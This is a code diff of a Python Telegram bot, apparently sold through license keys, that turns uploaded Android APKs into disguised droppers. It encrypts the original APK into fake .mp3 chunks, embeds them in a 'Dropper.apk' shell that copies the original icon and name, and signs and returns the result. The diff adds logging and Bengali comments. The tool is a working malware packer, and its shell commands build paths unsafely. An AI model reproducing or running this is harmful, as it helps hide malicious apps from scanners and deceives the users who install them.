@@ -11,11 +11,19 @@ import threading
 import random
 import string
 import time
+import logging
 from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
+
+# ----- লগিং সেটআপ -----
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
 # ----- Flask app for Render -----
 app = Flask(__name__)
@@ -28,12 +36,15 @@ def home():
 def health():
     return "OK"
 
-# ----- Configuration -----
+# ----- কনফিগারেশন -----
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
 if not BOT_TOKEN:
-    raise ValueError("BOT_TOKEN environment variable not set")
+    logger.error("❌ BOT_TOKEN environment variable not set!")
+    # Flask still runs, but bot won't start
+else:
+    logger.info("✅ BOT_TOKEN loaded successfully.")
 
-# ----- Crypto Configuration -----
+# ----- ক্রিপ্টো কনফিগারেশন (আপনার দেওয়া) -----
 OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
 OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="
 
@@ -52,7 +63,7 @@ NUM_PARTS = 15
 PREFIX = "part_"
 TARGET_PACKAGE = "com.meteah.apl"
 
-# ----- Database Setup -----
+# ----- ডাটাবেস সেটআপ -----
 DB_PATH = 'db/keys.db'
 os.makedirs('db', exist_ok=True)
 
@@ -63,6 +74,7 @@ def init_db():
                  (user_id INTEGER PRIMARY KEY, key TEXT, expiry_date TEXT)''')
     conn.commit()
     conn.close()
+    logger.info("Database initialized.")
 
 def generate_key(user_id):
     raw = os.urandom(16)
@@ -95,6 +107,7 @@ def get_user_key(user_id):
     conn.close()
     return row if row else None
 
+# ----- এনক্রিপশন ফাংশন (আপনার দেওয়া) -----
 def generate_build_id(length=16):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
@@ -130,15 +143,16 @@ def process_encryption(apk_data: bytes, assets_dir: str):
         "entropy_seed": generate_entropy_seed(),
         "v3_flag": True
     }
-    # Save files
     os.makedirs(assets_dir, exist_ok=True)
     with open(os.path.join(assets_dir, 'manifest.json'), 'w') as f:
         json.dump(meta, f, indent=4)
     for i, chunk in enumerate(chunks):
         with open(os.path.join(assets_dir, f"{PREFIX}{i}.mp3"), 'wb') as f:
             f.write(bytes(chunk))
+    logger.info(f"Encryption completed. {len(chunks)} chunks created in {assets_dir}")
     return meta
 
+# ----- APK প্রসেসিং (ব্যাকগ্রাউন্ডে) -----
 async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
@@ -151,12 +165,13 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 
         await context.bot.send_message(chat_id, "📦 Decoding APK...")
 
-        # Decode APK
+        # ডিকোড
         decoded_dir = os.path.join(work_dir, 'decoded')
         cmd = f"apktool d -f -o {decoded_dir} {input_apk}"
+        logger.info(f"Running: {cmd}")
         subprocess.run(cmd, shell=True, check=True, capture_output=True)
 
-        # Change package name
+        # প্যাকেজ নাম পরিবর্তন
         manifest_path = os.path.join(decoded_dir, 'AndroidManifest.xml')
         with open(manifest_path, 'r') as f:
             manifest = f.read()
@@ -166,29 +181,28 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 
         await context.bot.send_message(chat_id, "🔐 Encrypting...")
 
-        # Encrypt
+        # এনক্রিপ্ট
         assets_dir = os.path.join(decoded_dir, 'assets')
         process_encryption(apk_data, assets_dir)
 
-        # Decode Dropper APK
+        # Dropper.apk ডিকোড
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
-            # Create dummy if not exists
+            await context.bot.send_message(chat_id, "⚠️ Dropper.apk not found, creating dummy")
             with open(dropper_apk, 'wb') as f:
                 f.write(b'')
-            await context.bot.send_message(chat_id, "⚠️ Dropper.apk not found, using dummy")
-
         dropper_decoded = os.path.join(work_dir, 'dropper_decoded')
         cmd = f"apktool d -f -o {dropper_decoded} {dropper_apk}"
+        logger.info(f"Running: {cmd}")
         subprocess.run(cmd, shell=True, check=True, capture_output=True)
 
-        # Copy icon and name from user APK
+        # আইকন ও নাম কপি
         res_src = os.path.join(decoded_dir, 'res')
         res_dst = os.path.join(dropper_decoded, 'res')
         if os.path.exists(res_src):
             shutil.copytree(res_src, res_dst, dirs_exist_ok=True)
 
-        # Update app name
+        # app_name আপডেট
         strings_src = os.path.join(decoded_dir, 'res/values/strings.xml')
         if os.path.exists(strings_src):
             import xml.etree.ElementTree as ET
@@ -210,7 +224,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
                             break
                     dtree.write(strings_dst)
 
-        # Update manifest
+        # ম্যানিফেস্ট আপডেট
         dropper_manifest = os.path.join(dropper_decoded, 'AndroidManifest.xml')
         with open(dropper_manifest, 'r') as f:
             dmanifest = f.read()
@@ -219,29 +233,32 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
 
         await context.bot.send_message(chat_id, "✍️ Rebuilding APK...")
 
-        # Rebuild
+        # রিকম্পাইল
         output_apk = os.path.join(work_dir, 'output.apk')
         cmd = f"apktool b -o {output_apk} {dropper_decoded}"
+        logger.info(f"Running: {cmd}")
         subprocess.run(cmd, shell=True, check=True, capture_output=True)
 
-        # Sign
-        signed_apk = os.path.join(work_dir, 'signed.apk')
-        keystore = os.path.join(os.getcwd(), 'signer/myKey.p12')
+        # সাইন
+        keystore = os.path.join(os.getcwd(), 'signer/keystore.jks')
         passwd = os.environ.get('KEYSTORE_PASS', '123456')
         cmd = f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storepass {passwd} -keypass {passwd} {output_apk} mykey"
+        logger.info(f"Running: {cmd}")
         subprocess.run(cmd, shell=True, check=True, capture_output=True)
 
-        # Send to user
+        # ইউজারকে পাঠান
         with open(output_apk, 'rb') as f:
             await context.bot.send_document(chat_id, f, filename=f"app_{user_id}.apk")
 
         shutil.rmtree(work_dir)
+        logger.info(f"APK processing complete for user {user_id}")
 
     except Exception as e:
+        logger.error(f"Error processing APK: {e}")
         await context.bot.send_message(chat_id, f"❌ Error: {str(e)}")
         shutil.rmtree(work_dir, ignore_errors=True)
 
-# ----- Bot Commands -----
+# ----- বট কমান্ড -----
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("🔑 Get License Key", callback_data='get_key')],
@@ -249,9 +266,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        "🤖 Welcome!\n\nGet a 30-day license key to use this bot.",
+        "🤖 Welcome to APK Converter Bot!\n\n"
+        "You need a 30-day license key to use this bot.\n"
+        "Click 'Get License Key' to receive your key.",
         reply_markup=reply_markup
     )
+    logger.info(f"Start command from user {update.effective_user.id}")
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -261,14 +281,19 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if query.data == 'get_key':
         key = generate_key(user_id)
         await query.edit_message_text(
-            f"✅ Your 30-day key:\n\n`{key}`\n\nSend /activate {key}"
+            f"✅ Your 30-day license key:\n\n`{key}`\n\n"
+            f"Send /activate {key} to activate your account."
         )
+        logger.info(f"Key generated for user {user_id}")
     elif query.data == 'upload':
         key_data = get_user_key(user_id)
-        if not key_data or not validate_key(user_id, key_data[0]):
-            await query.edit_message_text("❌ No valid license. Get a key first.")
+        if not key_data:
+            await query.edit_message_text("❌ No license key found. Please get a key first.")
             return
-        await query.edit_message_text("📤 Send your APK file.")
+        if not validate_key(user_id, key_data[0]):
+            await query.edit_message_text("❌ Your license has expired. Please get a new key.")
+            return
+        await query.edit_message_text("📤 Please send me your APK file.")
 
 async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -276,55 +301,83 @@ async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not args:
         await update.message.reply_text("Usage: /activate <key>")
         return
-    if validate_key(user_id, args[0]):
+    key = args[0]
+    if validate_key(user_id, key):
         await update.message.reply_text("✅ Key activated! You can now upload APKs.")
     else:
-        await update.message.reply_text("❌ Invalid key.")
+        await update.message.reply_text("❌ Invalid key or expired.")
 
 async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     key_data = get_user_key(user_id)
     if not key_data or not validate_key(user_id, key_data[0]):
-        await update.message.reply_text("❌ No valid license. Use /start")
+        await update.message.reply_text("❌ No valid license. Use /start to get one.")
         return
 
     if not update.message.document or not update.message.document.file_name.endswith('.apk'):
         await update.message.reply_text("Please send an APK file.")
         return
 
-    await update.message.reply_text("📦 Processing... This may take a few minutes.")
+    await update.message.reply_text("📦 APK received! Processing... This may take a few minutes.")
     file = await update.message.document.get_file()
     apk_data = await file.download_as_bytearray()
-    
+
+    # ব্যাকগ্রাউন্ডে টাস্ক তৈরি
     context.application.create_task(process_apk_file(update, context, apk_data))
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("""
-🤖 Commands:
-/start - Main menu
-/activate <key> - Activate license
-/help - This help
+    help_text = """
+🤖 *APK Converter Bot Help*
 
-1. Get key from menu
-2. Activate with /activate
-3. Upload APK
-""")
+Commands:
+/start - Show main menu
+/activate <key> - Activate your license key
+/upload - Upload APK (or use menu)
+/help - Show this help
 
-# ----- Main -----
+*How it works:*
+1. Get a 30-day license key from the menu
+2. Activate it with /activate <key>
+3. Upload your APK
+4. Bot will:
+   - Change package name to com.meteah.apl
+   - Encrypt using AES+XOR
+   - Generate MP3 chunks + manifest.json
+   - Build a new APK with your icon & name
+   - Sign and zipalign
+   - Send you the final APK
+
+*Limitations:*
+- Only works with APK files
+- Processing may take 2-5 minutes
+- File size limit: 100 MB
+"""
+    await update.message.reply_text(help_text, parse_mode='Markdown')
+
+# ----- বট রান করার ফাংশন -----
 def run_bot():
-    init_db()
-    application = Application.builder().token(BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("activate", activate))
-    application.add_handler(CallbackQueryHandler(button_handler))
-    application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
-    application.run_polling()
+    try:
+        init_db()
+        if not BOT_TOKEN:
+            logger.error("BOT_TOKEN is missing. Bot will not start.")
+            return
+        application = Application.builder().token(BOT_TOKEN).build()
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("help", help_command))
+        application.add_handler(CommandHandler("activate", activate))
+        application.add_handler(CallbackQueryHandler(button_handler))
+        application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))
+        logger.info("Bot started polling...")
+        application.run_polling()
+    except Exception as e:
+        logger.error(f"Bot crashed: {e}")
 
+# ----- মেইন -----
 if __name__ == "__main__":
-    # Run bot in thread
+    # বট থ্রেড চালু
     bot_thread = threading.Thread(target=run_bot)
     bot_thread.start()
-    # Run Flask for Render
+    # Flask চালু
     port = int(os.environ.get("PORT", 5000))
+    logger.info(f"Flask server starting on port {port}")
     app.run(host="0.0.0.0", port=port)
